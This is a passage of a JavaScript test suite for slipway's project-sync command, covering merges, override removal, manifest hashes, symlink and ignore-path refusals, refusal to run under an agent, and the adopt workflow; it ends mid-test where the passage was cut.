const manifestBefore = manifestOf(edited);
const applied = sync(edited, '--apply', '--verbose');

test('apply, edited project: exits 1 — rows need the owner — with main unchanged and the tree clean', () => {
  assert.equal(applied.status, 1, applied.stdout + applied.stderr);
  assert.match(applied.stdout, /sync exits 1 until these are settled; nothing failed/);
  assert.equal(git(edited, 'rev-parse', 'main'), editedMain);
  assert.equal(git(edited, 'symbolic-ref', '--short', 'HEAD'), BRANCH);
  assert.equal(git(edited, 'status', '--porcelain'), '');
});

test('apply: seeded, collision and keep (edited) files are byte-identical; overrides.yaml too', () => {
  for (const [p, before] of kept) assert.deepEqual(bytes(edited, p), before, p);
});

test('apply: a seeded file slipway changed gets slipway\'s base → target diff in .slipway/upstream/<path>.diff', () => {
  const diff = join(edited, '.slipway/upstream/docs/PRD.md.diff');
  const at = mkdtempSync(join(root, 'patch-'));
  put(at, { 'docs/PRD.md': show(A, 'docs/PRD.md') });
  execFileSync('git', ['apply', diff], { cwd: at });
  assert.deepEqual(bytes(at, 'docs/PRD.md'), show(B, 'docs/PRD.md'));
  assert.match(applied.stdout, /Settled with you: 1 of your files started from slipway's template[^\n]*\n│ {2}slipway's change to each is saved under \.slipway\/upstream\//);
});

test('decisions.md is seeded, and /sync-slipway declines a D- entry a seeded diff adds instead of porting it', () => {
  assert.equal(classify(loadOwnership(SRC), 'decisions.md'), 'seeded');
  const skill = readFileSync(join(SRC, '.claude/skills/sync-slipway/SKILL.md'), 'utf8');
  assert.match(skill, /A seeded diff that adds a `D-` decision entry is slipway's record[^]*?Decline it/);
  assert.doesNotMatch(skill, /it cites \(a `D-` decision entry/);
});

test('README.md is slipway\'s own: a change to it is no row and no .slipway/upstream diff, and the real map classes it internal', () => {
  const r = sync(project());
  assert.equal(rows(r.stdout)['README.md'], undefined, r.stdout);
  assert.doesNotMatch(r.stdout, /README\.md/);
  const dir = project();
  sync(dir, '--apply');
  assert.equal(existsSync(join(dir, '.slipway/upstream/README.md.diff')), false);
  assert.equal(classify(loadOwnership(SRC), 'README.md'), 'internal');
});

test('apply: an overridden file that conflicts holds markers with both sides and every line of the project\'s version', () => {
  const merged = bytes(edited, 'process/merge.md').toString('utf8');
  assert.match(merged, /^<{7} project\n[\s\S]*^={7}\n[\s\S]*^>{7} slipway\n/m);
  assert.ok(merged.includes('two, upstream\n'), 'slipway\'s side');
  const lines = merged.split('\n');
  for (const l of ourMerge.split('\n')) assert.ok(lines.includes(l), `lost: ${l}`);
  assert.match(applied.stdout, /^│ {2}process\/merge\.md {2}merge — 1 conflict; resolve it, and keep its override$/m);
  // It keeps its old hash, so D1 still sees it as the override it is; its blob is the target's, so the base resolves.
  const f = manifestOf(edited).files['process/merge.md'];
  assert.equal(f.sha256, manifestBefore.files['process/merge.md'].sha256);
  assert.equal(f.blob, git(slip, 'rev-parse', `${B}:process/merge.md`));
});

test('apply: a file removed upstream that the project edited is kept, reported as keep (edited), and its override is named, not edited', () => {
  assert.equal(rows(applied.stdout)['process/kept.md'], 'keep (edited)');
  assert.match(applied.stdout, /^│ {2}process\/kept\.md {2}keep \(edited\) — slipway removed it/m);
  assert.match(applied.stdout, /^│ {2}\.slipway\/overrides\.yaml:4 {2}path: process\/kept\.md {2}stale override — /m);
  assert.equal(manifestOf(edited).files['process/kept.md'], undefined);
});

test('apply: a new upstream file at a path the project has is reported as collision and recorded at slipway\'s hash, so D1 flags it', () => {
  assert.equal(rows(applied.stdout)['process/clash.md'], 'collision');
  assert.match(applied.stdout, /^│ {2}process\/clash\.md {2}collision — /m);
  assert.equal(manifestOf(edited).files['process/clash.md'].blob, git(slip, 'rev-parse', `${B}:process/clash.md`));
});

test('apply: the manifest and the file changes land in one commit', () => {
  assert.equal(git(edited, 'rev-list', '--count', `main..${BRANCH}`), '1');
  const stat = git(edited, 'show', '--stat=200', '--format=%s', 'HEAD');
  assert.match(stat, new RegExp(`^chore: sync slipway ${short(A)}\\.\\.${short(B)}\n`));
  for (const p of [MANIFEST, 'process/replace.md', 'process/merge.md', 'process/delete.md', 'process/new.md', 'package.json', '.slipway/upstream/docs/PRD.md.diff']) {
    assert.ok(stat.includes(` ${p} `), `${p} is not in the commit:\n${stat}`);
  }
});

test('apply: the harness — an installed copy is updated because the owner ran sync; an edited one is left and exits 1', () => {
  const installed = (body) => project((d) => { put(d, { '.claude/settings.json': body }); commit(d, 'install the harness'); });
  const dir = installed(show(A, 'process/harness/settings.json'));
  const r = sync(dir, '--apply');
  assert.deepEqual(bytes(dir, 'process/harness/settings.json'), show(B, 'process/harness/settings.json'));
  assert.deepEqual(bytes(dir, '.claude/settings.json'), show(B, 'process/harness/settings.json'));
  assert.match(r.stdout, /^│ {2}process\/harness\/settings\.json changed, and this run installed it as \.claude\/settings\.json: nothing is left to run$/m);
  assert.match(git(dir, 'show', '--stat=200', '--format=', 'HEAD'), /^\s*\.claude\/settings\.json\s+\|/m);

  const mine = installed('{ "mine": true }\n');
  const e = sync(mine, '--apply');
  assert.equal(e.status, 1);
  assert.deepEqual(bytes(mine, '.claude/settings.json'), Buffer.from('{ "mine": true }\n'));
  assert.match(e.stdout, /\.claude\/settings\.json was edited, so it was left as it is/);
});

test('apply refuses an existing sync branch before writing anything', () => {
  const dir = project((d) => git(d, 'branch', BRANCH));
  const before = treeHash(dir);
  const r = sync(dir, '--apply');
  assert.equal(r.status, 1);
  assert.match(r.stderr, /branch slipway\/sync-\S+ already exists/);
  assert.equal(treeHash(dir), before);
});

// One owner row per project, each alone: sync exits 1 on it, and 0 when nothing needs the owner.
const pristine = (edit) => project((d) => {
  git(d, 'reset', '-q', '--hard', 'HEAD~1');
  edit(d);
  commit(d, 'one owner row');
});
const override = (p) => `overrides:\n  - path: ${p}\n    reason: ours\n`;
for (const [why, edit, code] of [
  ['a merge that conflicts', (d) => put(d, { 'process/merge.md': 'one\ntwo, ours\n', '.slipway/overrides.yaml': override('process/merge.md') }), 1],
  ['a collision', (d) => put(d, { 'process/clash.md': 'ours\n' }), 1],
  ['keep (edited)', (d) => put(d, { 'process/kept.md': 'kept, ours\n', '.slipway/overrides.yaml': override('process/kept.md') }), 1],
  ['keep (edited) alone (deleted here under an override, changed upstream)', (d) => put(d, { 'process/replace.md': null, '.slipway/overrides.yaml': override('process/replace.md') }), 1],
  ['a key reported', (d) => put(d, { 'package.json': bytes(d, 'package.json').toString('utf8').replace('"echo b"', '"echo mine"') }), 1],
  ['an override made stale (the file deleted here, and upstream)', (d) => put(d, { 'process/kept.md': null, '.slipway/overrides.yaml': override('process/kept.md') }), 1],
  ['an edited harness copy', (d) => put(d, { '.claude/settings.json': '{ "mine": true }\n' }), 1],
  ['an installed harness copy, and nothing else', (d) => put(d, { '.claude/settings.json': show(A, 'process/harness/settings.json') }), 0],
]) {
  test(`apply exits ${code} on ${why}`, () => {
    const r = sync(pristine(edit), '--apply');
    assert.equal(r.status, code, r.stdout + r.stderr);
  });
}

// An override slipway has absorbed (#132): the owner's edit is slipway's copy now. Sync records slipway's
// hash for it and, since the entry excuses nothing, --apply removes it from the overrides in the same
// commit (#135, D-021): the plan says so ahead, not under "Needs you by hand", and D1 is green with no hand edit.
const d1 = (dir) => spawnSync(process.execPath, [join(SRC, 'ci/checks/meta/d1-drift.mjs'), dir], { encoding: 'utf8' });
// The plan and --apply both say it as a count (F-08 §3): which entry it is, `--json` names (overrides.absorbed).
const removed = /^│ {2}1 override removed: slipway's copy now equals yours$/m;

test('a mixed overrides file: --apply removes the absorbed entry in the same commit, keeps the one still differing and every comment; the plan said so, not under Needs you; D1 green, exit 0', () => {
  const mixed = [
    '# why we keep our own copies\n',
    'overrides:\n',
    '  # slipway took this edit upstream\n',
    '  - path: process/replace.md\n',
    '    # the entry\'s own comment stays too\n',
    '    reason: ours # until slipway ships it\n',
    '\n',
    '  - path: process/merge.md\n',
    '    reason: ours\n',
    '# end\n',
  ];
  const dir = pristine((d) => put(d, {
    'process/replace.md': show(B, 'process/replace.md'), // the owner's edit is the one slipway shipped
    'process/merge.md': 'zero, ours\none\ntwo\n', // merges clean, and still differs from slipway's copy
    '.slipway/overrides.yaml': mixed.join(''),
  }));
  const planned = sync(dir);
  assert.equal(planned.status, 0, planned.stderr);
  assert.match(planned.stdout, removed); // one: process/merge.md still differs, and keeps its entry
  assert.deepEqual(JSON.parse(sync(dir, '--json').stdout).overrides.absorbed.map((o) => o.path), ['process/replace.md']);
  assert.doesNotMatch(planned.stdout, /Needs you/);
  assert.match(planned.stdout, /Nothing needs you by hand\.\n/);

  const before = manifestOf(dir);
  const r = sync(dir, '--apply', '--verbose');
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.equal(rows(r.stdout)['process/replace.md'], 'merge');
  assert.match(r.stdout, removed);
  assert.doesNotMatch(r.stdout, /stale override/);
  // The entry's own lines go; every comment and the other entry stay byte for byte.
  assert.equal(bytes(dir, '.slipway/overrides.yaml').toString('utf8'), mixed.filter((_, i) => i !== 3 && i !== 5).join(''));
  assert.equal(git(dir, 'rev-parse', 'HEAD~1'), git(dir, 'rev-parse', 'main'), 'one commit');
  assert.match(git(dir, 'show', '--name-only', '--format=', 'HEAD'), /^\.slipway\/overrides\.yaml$/m);
  const after = manifestOf(dir);
  assert.equal(after.files['process/replace.md'].sha256, sha256(show(B, 'process/replace.md')));
  // A file that still differs keeps its own hash, and its override.
  assert.equal(after.files['process/merge.md'].sha256, before.files['process/merge.md'].sha256);
  const green = d1(dir);
  assert.equal(green.status, 0, green.stdout);
});

test('an override on a file slipway did not change, kept at an old hash by a sync before #132: the next sync records slipway\'s hash and removes the entry, and exits 0 with D1 green', () => {
  const dir = pristine((d) => put(d, { 'process/replace.md': show(B, 'process/replace.md'), '.slipway/overrides.yaml': override('process/replace.md') }));
  const old = manifestOf(dir).files['process/replace.md'].sha256;
  sync(dir, '--apply');
  git(dir, 'switch', '-q', 'main');
  git(dir, 'merge', '-q', '--ff-only', BRANCH);
  git(dir, 'branch', '-q', '-D', BRANCH);
  // The record a sync before #132 left: the merge kept the project's old hash, and the override stayed.
  // A project's real state, written here only because this sync no longer produces it.
  const m = manifestOf(dir);
  m.files['process/replace.md'].sha256 = old;
  put(dir, { [MANIFEST]: `${JSON.stringify(m, null, 2)}\n`, '.slipway/overrides.yaml': override('process/replace.md') });
  commit(dir, 'as a sync before #132 recorded it');
  assert.equal(d1(dir).status, 0);

  const planned = sync(dir, '--verbose');
  assert.equal(rows(planned.stdout)['process/replace.md'], 'unchanged');
  assert.match(sync(dir).stdout, removed);
  const r = sync(dir, '--apply');
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.match(r.stdout, removed);
  assert.equal(manifestOf(dir).files['process/replace.md'].sha256, sha256(show(B, 'process/replace.md')));
  assert.equal(bytes(dir, '.slipway/overrides.yaml').toString('utf8'), 'overrides:\n');
  const green = d1(dir);
  assert.equal(green.status, 0, green.stdout);
});

test('a merge of an edit slipway shipped with more: the result is slipway\'s copy though the project\'s was not; recorded at slipway\'s hash, the entry removed, exit 0', () => {
  const partial = show(B, 'process/replace.md').toString('utf8').replace('end2', 'end1'); // slipway's first hunk only
  const dir = pristine((d) => put(d, { 'process/replace.md': partial, '.slipway/overrides.yaml': override('process/replace.md') }));
  assert.notDeepEqual(bytes(dir, 'process/replace.md'), show(B, 'process/replace.md'));
  assert.match(sync(dir).stdout, removed);
  const r = sync(dir, '--apply', '--verbose');
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.equal(rows(r.stdout)['process/replace.md'], 'merge');
  assert.deepEqual(bytes(dir, 'process/replace.md'), show(B, 'process/replace.md'));
  assert.equal(manifestOf(dir).files['process/replace.md'].sha256, sha256(show(B, 'process/replace.md')));
  assert.match(r.stdout, removed);
  assert.equal(d1(dir).status, 0);
});

test('withoutOverrides: drops only the entries on the given lines — CRLF, a head at column 0, no final newline — and refuses a file that no longer holds what was planned', () => {
  const dir = mkdtempSync(join(root, 'overrides-'));
  const at = (text) => {
    put(dir, { '.slipway/overrides.yaml': text });
    return readOverrides(dir);
  };
  const crlf = 'overrides:\r\n  - path: a.md\r\n    # kept\r\n    reason: x\r\n  - path: b.md\r\n    reason: y\r\n';
  let list = at(crlf);
  assert.equal(withoutOverrides(dir, list, [list[0]]).toString('utf8'), 'overrides:\r\n    # kept\r\n  - path: b.md\r\n    reason: y\r\n');
  const flush = 'overrides:\n- path: a.md\n  reason: x\n- path: b.md\n  reason: y';
  list = at(flush);
  assert.equal(withoutOverrides(dir, list, [list[1]]).toString('utf8'), 'overrides:\n- path: a.md\n  reason: x\n');
  // A top-level line after a dropped entry ends it, and stays.
  const late = '- path: a.md\n  reason: x\noverrides:\n- path: b.md\n  reason: y\n';
  list = at(late);
  assert.equal(withoutOverrides(dir, list, [list[0]]).toString('utf8'), 'overrides:\n- path: b.md\n  reason: y\n');
  // Bytes that are not UTF-8 (a Windows-1252 é) on kept lines are kept as they are.
  const legacy = Buffer.from('# caf\xE9\noverrides:\n  - path: a.md\n    reason: x\n  - path: b.md\n    reason: caf\xE9\n', 'latin1');
  put(dir, { '.slipway/overrides.yaml': legacy });
  list = readOverrides(dir);
  assert.deepEqual(withoutOverrides(dir, list, [list[0]]), Buffer.from('# caf\xE9\noverrides:\n  - path: b.md\n    reason: caf\xE9\n', 'latin1'));
  // The file on disk moved since `list` was read: an entry was added above.
  put(dir, { '.slipway/overrides.yaml': `overrides:\n  - path: new.md\n    reason: z\n${flush.slice('overrides:\n'.length)}` });
  assert.throws(() => withoutOverrides(dir, list, [list[0]]), /changed after it was planned — nothing was written/);
});

test('a plan that --apply would refuse stops with the same reason, saying --apply would refuse it too, and writes nothing', () => {
  const dir = pristine((d) => put(d, { 'package.json': null })); // slipway adds a script key; there is no package.json to add it to
  const before = treeHash(dir);
  const r = sync(dir);
  assert.equal(r.status, 1, r.stdout);
  assert.match(r.stderr, /package\.json is missing[^\n]*\n--apply would refuse this too, so the plan stops here\.\n$/);
  assert.equal(treeHash(dir), before);
  assert.match(sync(dir, '--apply').stderr, /package\.json is missing/);
});

test('apply never writes through a symlink: a diff path or the manifest that is one is refused, and the file it points to is intact', () => {
  for (const at of ['.slipway/upstream/docs/PRD.md.diff', MANIFEST]) {
    const outside = join(mkdtempSync(join(root, 'outside-')), 'precious.txt');
    const dir = project((d) => {
      if (at === MANIFEST) writeFileSync(outside, readFileSync(join(d, MANIFEST)));
      else writeFileSync(outside, 'precious\n');
      rmSync(join(d, at), { force: true });
      mkdirSync(dirname(join(d, at)), { recursive: true });
      symlinkSync(outside, join(d, at));
      commit(d, `a symlink at ${at}`);
    });
    const before = [treeHash(dir), readFileSync(outside)];
    const r = sync(dir, '--apply');
    assert.equal(r.status, 1, `${at}: ${r.stdout}`);
    assert.match(r.stderr, new RegExp(`symlinks or directories[\\s\\S]*${at.replaceAll('.', '\\.')}`));
    assert.deepEqual([treeHash(dir), readFileSync(outside)], before);
  }
});

test('apply refuses before branching when a file of the project sits where it must write a folder', () => {
  const cases = [
    ['.slipway/upstream', (d) => put(d, { '.slipway/upstream': 'mine\n' })],
    ['process/dir', (d) => { git(d, 'reset', '-q', '--hard', 'HEAD~1'); put(d, { 'process/dir': 'ours\n', '.slipway/overrides.yaml': override('process/dir') }); }],
  ];
  for (const [at, edit] of cases) {
    const dir = project((d) => { edit(d); commit(d, `a file at ${at}`); });
    const before = treeHash(dir);
    const r = sync(dir, '--apply');
    assert.equal(r.status, 1, `${at}: ${r.stdout}`);
    assert.match(r.stderr, new RegExp(`each is a file of yours[\\s\\S]*\n  ${at.replaceAll('.', '\\.')}\n`));
    assert.equal(treeHash(dir), before);
  }
});

test('apply refuses a write the project ignores before branching, naming it', () => {
  const dir = project((d) => { put(d, { '.gitignore': 'node_modules/\n.slipway/upstream/\n' }); commit(d, 'ignore upstream diffs'); });
  const before = treeHash(dir);
  const r = sync(dir, '--apply');
  assert.equal(r.status, 1);
  assert.match(r.stderr, /the project ignores paths sync would write[\s\S]*\.slipway\/upstream\/docs\/PRD\.md\.diff/);
  assert.equal(treeHash(dir), before);
});

test('apply refuses under an agent (CLAUDECODE set), writing nothing; the harness asks before either form of the command', () => {
  const dir = project();
  const before = treeHash(dir);
  const r = spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), 'sync', '--apply'], { cwd: dir, encoding: 'utf8', env: { ...process.env, CLAUDECODE: '1' } });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /the owner runs it in their own terminal, not an agent \(CLAUDECODE is set\)/);
  assert.equal(treeHash(dir), before);
  // Claude Code's Bash rules: `*` matches anything, `:*` a trailing prefix.
  const asks = JSON.parse(readFileSync(join(SRC, 'process/harness/settings.json'), 'utf8')).permissions.ask
    .filter((a) => a.startsWith('Bash('))
    .map((a) => new RegExp(`^${a.slice(5, -1).replace(/:\*$/, '*').replace(/[.+?^${}()|[\]\\]/g, '\\$&').replaceAll('*', '.*')}$`));
  for (const cmd of ['pnpm -s use-slipway sync --apply', 'pnpm use-slipway sync --apply', 'npx github:matldupont/slipway#main sync --apply', 'node scripts/new-project.mjs sync --apply', 'node ../slipway/scripts/new-project.mjs sync --apply', 'npx github:matldupont/slipway#main sync --adopt --apply --base abc', 'node ../slipway/scripts/new-project.mjs sync --apply --adopt']) {
    assert.ok(asks.some((re) => re.test(cmd)), `no ask rule matches: ${cmd}`);
  }
});

test('apply only moves forward: a target older than the base is refused', () => {
  const dir = project((d) => git(d, 'reset', '-q', '--hard', 'HEAD~1'));
  assert.equal(sync(dir, '--apply').status, 0); // now at B
  const older = join(root, 'packed-a');
  mkdirSync(older);
  execFileSync('tar', ['-x', '-C', older], { input: execFileSync('git', ['-C', slip, 'archive', A]) });
  git(dir, 'switch', '-q', 'main');
  git(dir, 'merge', '-q', '--ff-only', BRANCH);
  git(dir, 'branch', '-q', '-D', BRANCH);
  const before = treeHash(dir);
  const r = spawnSync(process.execPath, [join(older, 'scripts', 'new-project.mjs'), 'sync', '--apply'], { cwd: dir, encoding: 'utf8' });
  assert.equal(r.status, 1, r.stdout);
  assert.match(r.stderr, /is not newer than the base .* sync only moves forward/);
  assert.equal(treeHash(dir), before);
});

// ---- --adopt (F-01 step 5, #18): one case per Acceptance line

const adopt = (dir, ...args) =>
  spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), 'sync', '--adopt', ...args], { cwd: dir, encoding: 'utf8', env: { ...process.env, SLIPWAY_SOURCE: slip } });
// The edited project with its .slipway/ gone: what a project created before the manifest looks like.
// Its first commit is new-project's `chore: start from slipway <A>`.
const unadopted = (edit) => project((d) => {
  rmSync(join(d, '.slipway'), { recursive: true });
  if (edit) edit(d);
  commit(d, 'before the manifest');
});
const DIFFERS = ['process/kept.md', 'process/merge.md', 'process/ours.md'];

test('adopt, sha in the first commit: that sha is the base, every file is listed as pristine or differing, and the tree hash is unchanged', () => {
  const dir = unadopted();
  const before = treeHash(dir);
  const r = adopt(dir, '--verbose');
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, new RegExp(`base: {3}${A} \\(from the first commit\\)`));
  const got = rows(r.stdout);
  for (const p of git(slip, 'ls-tree', '-r', '--name-only', A).split('\n').filter((p) => p.startsWith('process/') || p === '.gitattributes')) {
    assert.equal(got[p], DIFFERS.includes(p) ? 'changed by you' : 'unchanged since install', p);
  }
  for (const p of ['docs/PRD.md', 'docs/same.md', '.gitignore']) assert.equal(got[p], "your file (started from slipway's template)", p);
  assert.equal(got['package.json'], 'package.json scripts');
  assert.equal(got['process/clash.md'], undefined, 'a file the base does not ship is the project\'s own');
  assert.equal(treeHash(dir), before, 'adopt wrote to the project');
  assert.equal(git(dir, 'status', '--porcelain'), '');
});

test('the default adopt plan is a summary: a count line per bucket, each differing path and project ID with its next command, the base explained', () => {
  const dir = unadopted((d) => put(d, { 'decisions.md': '# Decisions\n\n## D-099 — ours *(decided)*\n' }));
  const before = treeHash(dir);
  const r = adopt(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.equal(normalise(r.stdout), readFileSync(EXPECTED_ADOPT_SUMMARY, 'utf8'));
  assert.doesNotMatch(r.stdout, /^ {2}unchanged since install {2,}\S/m, 'an unchanged row is printed');
  assert.equal(treeHash(dir), before, 'adopt wrote to the project');
});

test('a default adopt plan with nothing to decide says so in one line and prints the --apply command', () => {
  const dir = unadopted((d) => put(d, { 'process/kept.md': 'kept\n', 'process/merge.md': 'one\ntwo\n', 'process/ours.md': 'ours\n' }));
  const r = adopt(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /^Nothing needs a decision\.$/m);
  assert.match(r.stdout, new RegExp(`Plan only — nothing was written\\. Write it with: npx github:matldupont/slipway#main sync --adopt --apply --base ${A}\n$`));
  assert.doesNotMatch(r.stdout, /Needs you/);
});

// A project new-project made from a packed A: the first commit and README name a version, not a sha.
const versioned = join(root, 'versioned');
{
  const pkgDir = join(root, 'packed-a-adopt');
  mkdirSync(pkgDir);
  execFileSync('tar', ['-x', '-C', pkgDir], { input: execFileSync('git', ['-C', slip, 'archive', A]) });
  const r = spawnSync(process.execPath, [join(pkgDir, 'scripts', 'new-project.mjs'), versioned, '--no-github', '--no-harness'], { encoding: 'utf8', env: { ...process.env, SLIPWAY_SOURCE: slip } });
  assert.equal(r.status, 0, r.stdout + r.stderr);
  rmSync(join(versioned, '.slipway'), { recursive: true });
  commit(versioned, 'before the manifest');
}

test('adopt, a version in the first commit: proposes the closest commit with the runner-up\'s count, and writes nothing until --base confirms it', () => {
  assert.equal(git(versioned, 'log', '--format=%s', '--reverse').split('\n')[0], 'chore: start from slipway 0.0.0-fixture');
  const before = treeHash(versioned);
  for (const args of [[], ['--apply']]) {
    const r = adopt(versioned, ...args);
    assert.equal(r.status, 1, r.stdout);
    // A and A0 hold the same managed blobs; the walk is newest first, so A0 leads and A is the runner-up.
    const n = git(slip, 'ls-tree', '-r', '--name-only', A).split('\n').filter((p) => p.startsWith('process/') || p === '.gitattributes').length;
    assert.match(r.stderr, new RegExp(`no slipway sha in the first commit or README \\(chore: start from slipway 0\\.0\\.0-fixture\\)\\. Closest commit on \\S+'s main:\\n  ${A0} — ${n} of slipway's file\\(s\\)[^\\n]*\\n[^\\n]*\\n  runner-up: ${A} — ${n} of slipway's file\\(s\\)`));
    assert.match(r.stderr, new RegExp(`Confirm it \\(or name another\\) with: npx github:matldupont/slipway#main sync --adopt --base ${A0} — nothing was written`));
    assert.equal(treeHash(versioned), before);
  }
  const r = adopt(versioned, '--base', A.slice(0, 10));
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, new RegExp(`base: {3}${A} \\(from --base\\)`));
  assert.equal(treeHash(versioned), before);
});

test('adopt with no resolvable base and no --base exits non-zero and asks for --base <sha>, writing nothing', () => {
  // Nothing in common with slipway, and a version in the first commit.
  const lone = join(root, 'lone');
  mkdirSync(lone);
  git(lone, 'init', '-q', '-b', 'main');
  put(lone, { 'README.md': '# not from slipway\n' });
  commit(lone, 'chore: start from slipway 0.0.0-fixture');
  // A README naming a sha the source does not have (a fork's), on a history whose first commit names a version.
  const forked = unadopted((d) => put(d, { 'README.md': `Built on [slipway](SLIPWAY.md) ${'f'.repeat(40)}.\n` }));
  git(forked, 'checkout', '-q', '--orphan', 'fresh');
  commit(forked, 'chore: start from slipway 0.0.0-fixture');
  for (const [dir, args, why] of [
    [lone, [], /no commit on \S+'s main shares one of slipway's files with this project — pass --base <sha>/],
    [forked, [], /README\.md names slipway f{40}, which \S+ does not have \(a fork, or never pushed\) — pass --base <sha>/],
    [forked, ['--base', 'e'.repeat(40)], /--base names slipway e{40}, which \S+ does not have/],
    [forked, ['--base', 'HEAD'], /--base "HEAD" is not a commit sha — pass --base <sha>/],
  ]) {
    const before = treeHash(dir);
    const r = adopt(dir, ...args);
    assert.equal(r.status, 1, r.stdout);
    assert.match(r.stderr, why);
    assert.equal(treeHash(dir), before);
  }
});

test('adopt refuses a project that has a manifest, and --apply under an agent, writing nothing', () => {
  const has = project();
  assert.match(adopt(has).stderr, /\.slipway\/manifest\.json exists already — this project has adopted sync; run `sync`/);
  const dir = unadopted();
  const before = treeHash(dir);
  const r = spawnSync(process.execPath, [join(slip, 'scripts', 'new-project.mjs'), 'sync', '--adopt', '--apply', '--revert', 'process/kept.md'], { cwd: dir, encoding: 'utf8', env: { ...process.env, SLIPWAY_SOURCE: slip, CLAUDECODE: '1' } });
  assert.equal(r.status, 1);
  assert.match(r.stderr, /the owner runs it in their own terminal, not an agent \(CLAUDECODE is set\)/);
  assert.equal(treeHash(dir), before);
});

test('adopt --apply refuses until every differing managed file is kept or reverted, and refuses a choice for a file that needs none', () => {
  const dir = unadopted();
  const before = treeHash(dir);
  const cases = [
    [[], /needs --keep <path>=<reason> or --revert <path>, and \.slipway\/overrides\.yaml may list only those it keeps — nothing was written:\n {2}changed by you {2}process\/kept\.md\n {2}changed by you {2}process\/merge\.md\n {2}changed by you {2}process\/ours\.md$/m],
    [['--keep', 'process/same.md=ours', '--revert', 'process/kept.md'], /process\/same\.md already matches the base/],
    [['--keep', 'docs/PRD.md=ours'], /docs\/PRD\.md is not one of slipway's files that the base ships/],
    [['--keep', 'process/ours.md='], /give the reason after "="/],
    [['--keep', 'process/ours.md=x', '--revert', 'process/ours.md'], /--keep or --revert, not both/],
    [['--keep', 'process/ours.md=ours # and more', '--keep', 'process/merge.md=m', '--revert', 'process/kept.md'], /cannot be written as one plain line/],
  ];
  for (const [args, why] of cases) {
    const r = adopt(dir, '--apply', ...args);
    assert.equal(r.status, 1, `${why}\n${r.stdout}`);
    assert.match(r.stderr, why);
    assert.equal(treeHash(dir), before, `${args} wrote to the project`);
  }
});

test('adopt --apply writes the manifest and an override per kept file, reverts in the same commit on slipway/adopt-<base>; D1 is green, and sync then finds the base exactly', () => {
  const dir = unadopted();
  const mainBefore = git(dir, 'rev-parse', 'main');
  const ours = bytes(dir, 'process/kept.md');
  const r = adopt(dir, '--apply', '--keep', 'process/merge.md=our third line', '--keep', 'process/ours.md=our wording', '--revert', 'process/kept.md');
  assert.equal(r.status, 0, r.stderr);
  assert.equal(git(dir, 'branch', '--show-current'), `slipway/adopt-${short(A)}`);
  assert.equal(git(dir, 'rev-parse', 'main'), mainBefore);
  assert.equal(git(dir, 'rev-list', '--count', 'main..HEAD'), '1');
  assert.equal(git(dir, 'log', '-1', '--format=%s'), `chore: adopt slipway sync at ${short(A)}`);
  assert.deepEqual(git(dir, 'diff', '--name-only', 'main', 'HEAD').split('\n').sort(), ['.slipway/manifest.json', '.slipway/overrides.yaml', 'process/kept.md']);
  assert.equal(git(dir, 'status', '--porcelain'), '');
  // The project's version stays in history; the working tree has the base's.
  assert.deepEqual(execFileSync('git', ['-C', dir, 'show', 'main:process/kept.md']), ours);
  assert.deepEqual(bytes(dir, 'process/kept.md'), show(A, 'process/kept.md'));
  assert.equal(bytes(dir, '.slipway/overrides.yaml').toString('utf8'), 'overrides:\n  - path: process/merge.md\n    reason: our third line\n  - path: process/ours.md\n    reason: our wording\n');
  const m = manifestOf(dir);
  assert.equal(m.slipway, A);
  assert.equal(m.version, '0.0.0-fixture');
  for (const [p, f] of Object.entries(m.files)) if (f.class === 'managed') assert.equal(f.blob, git(slip, 'rev-parse', `${A}:${p}`), p);
  assert.equal(m.files['docs/PRD.md'].blob, git(dir, 'rev-parse', 'HEAD:docs/PRD.md'), 'a seeded file is recorded as the project has it');
  const d1 = spawnSync(process.execPath, [join(SRC, 'ci/checks/meta/d1-drift.mjs'), dir], { encoding: 'utf8' });
  assert.equal(d1.status, 0, d1.stdout);
  const plan = sync(dir, '--verbose');
  assert.equal(plan.status, 0, plan.stderr);
  assert.match(plan.stdout, new RegExp(`base: {3}${A} `));
  assert.equal(rows(plan.stdout)['process/merge.md'], 'merge');
});

test('adopt lists the project\'s own lessons and decisions, still on L-/D-, for /sync-slipway to move', () => {
  const dir = unadopted((d) => put(d, {
    'process/lessons/L-99-ours.md': '---\nid: L-99\nrule: ours\nenforcement:\n  status: check\n  pointer: d1\n---\n',
    'process/lessons/PL-1-moved.md': '---\nid: PL-1\nrule: already moved\nenforcement:\n  status: check\n  pointer: d1\n---\n',
    'decisions.md': '# Decisions\n\n## D-099 — ours *(decided)*\n\n## PD-1 — moved *(decided)*\n',
  }));
  const r = adopt(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, /The project's own IDs, for \/sync-slipway to renumber [^\n]*\n {2}L-99 {2}process\/lessons\/L-99-ours\.md\n {2}D-099 {2}decisions\.md\n\n/);
});

test('resolveBase: a commit older than the ownership map is classified by the fallback map, so it can be exact', () => {
  const old = join(root, 'premap');
  mkdirSync(old);
  git(old, 'init', '-q', '-b', 'main');
  put(old, { 'process/a.md': 'a\n', 'docs/PRD.md': '# PRD\n' });
  const P = commit(old, 'before the map');
  const rules = [{ glob: 'process/**', class: 'managed', re: /^process\/.*$/ }, { glob: 'docs/**', class: 'seeded', re: /^docs\/.*$/ }];
  const blobs = new Map([['process/a.md', git(old, 'rev-parse', `${P}:process/a.md`)]]);
  const gitDir = join(old, '.git');
  assert.equal(resolveBase(gitDir, blobs).exact, null);
  assert.equal(resolveBase(gitDir, blobs, { fallback: rules }).exact, P);
});

test('adopt: a short sha in the first commit (new-project before the manifest wrote `rev-parse --short`) is the base', () => {
  const dir = unadopted();
  git(dir, 'checkout', '-q', '--orphan', 'short');
  commit(dir, `chore: start from slipway ${A.slice(0, 7)}`);
  const r = adopt(dir);
  assert.equal(r.status, 0, r.stderr);
  assert.match(r.stdout, new RegExp(`base: {3}${A} \\(from the first commit\\)`));
});

test('adopt: a differing file overrides.yaml already lists with a reason is kept; an override D1 would call stale stops --apply', () => {
  const listed = unadopted((d) => put(d, { '.slipway/overrides.yaml': 'overrides:\n  - path: process/merge.md\n    reason: our third line\n' }));
